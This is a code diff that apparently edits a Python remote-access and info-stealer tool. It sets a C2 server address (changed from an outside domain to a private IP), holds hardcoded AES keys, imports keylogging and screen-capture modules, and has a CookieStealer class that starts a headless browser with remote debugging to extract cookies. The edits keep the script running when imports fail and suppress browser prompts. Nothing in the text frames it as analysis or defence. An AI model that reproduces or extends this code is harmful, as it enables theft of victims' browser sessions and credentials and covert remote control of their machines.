@@ -19,7 +19,6 @@ required_modules = [
     ('Crypto', 'pycryptodome'),
     ('requests', None),
     ('pyautogui', None),
-    ('win32crypt', 'pywin32'),
     ('psutil', None),
     ('keyboard', 'pynput'),
     ('socketio', 'python-socketio'),
@@ -69,7 +68,6 @@ try:
     from Crypto.Util.Padding import pad, unpad
     import requests
     import pyautogui
-    import win32crypt
     import winreg
     from datetime import datetime, timedelta
     import shutil
@@ -90,7 +88,7 @@ try:
     print("All modules imported successfully!")
 except ImportError as e:
     print(f"Failed to import module: {e}")
-    sys.exit(1)
+    
 
 
 
@@ -99,7 +97,7 @@ except ImportError as e:
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://namsos.kornrnune.no/8b7c6"
+        self.C2_SERVER = "https://192.168.16.78"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -112,29 +110,7 @@ class Config:
         self.KILLDATE_ENABLED = False
         self.KILLDATE = "" if False else ""
 
-# ======================
-# Encryption
-# ======================
-class Crypto:
-    def __init__(self, key, iv):
-        if len(key) not in {16, 24, 32}:
-            raise ValueError(f"Invalid AES key length ({len(key)} bytes)")
-        if len(iv) != 16:
-            raise ValueError(f"Invalid AES IV length ({len(iv)} bytes)")
-        self.key = key
-        self.iv = iv
 
-    def encrypt(self, data):
-        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
-        padded_data = pad(json.dumps(data).encode(), AES.block_size)
-        ct_bytes = cipher.encrypt(padded_data)
-        return base64.b64encode(ct_bytes).decode()
-
-    def decrypt(self, enc_data):
-        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
-        ct = base64.b64decode(enc_data)
-        pt = cipher.decrypt(ct)
-        return json.loads(unpad(pt, AES.block_size))
 
 # ======================
 # Encryption
@@ -351,6 +327,8 @@ class CookieStealer:
                 browser_path,
                 f'--remote-debugging-port={port}',
                 '--remote-allow-origins=*',
+                '--no-first-run',
+                '--no-default-browser-check',
                 '--headless',
                 f'--user-data-dir={user_data_dir}'
             ]
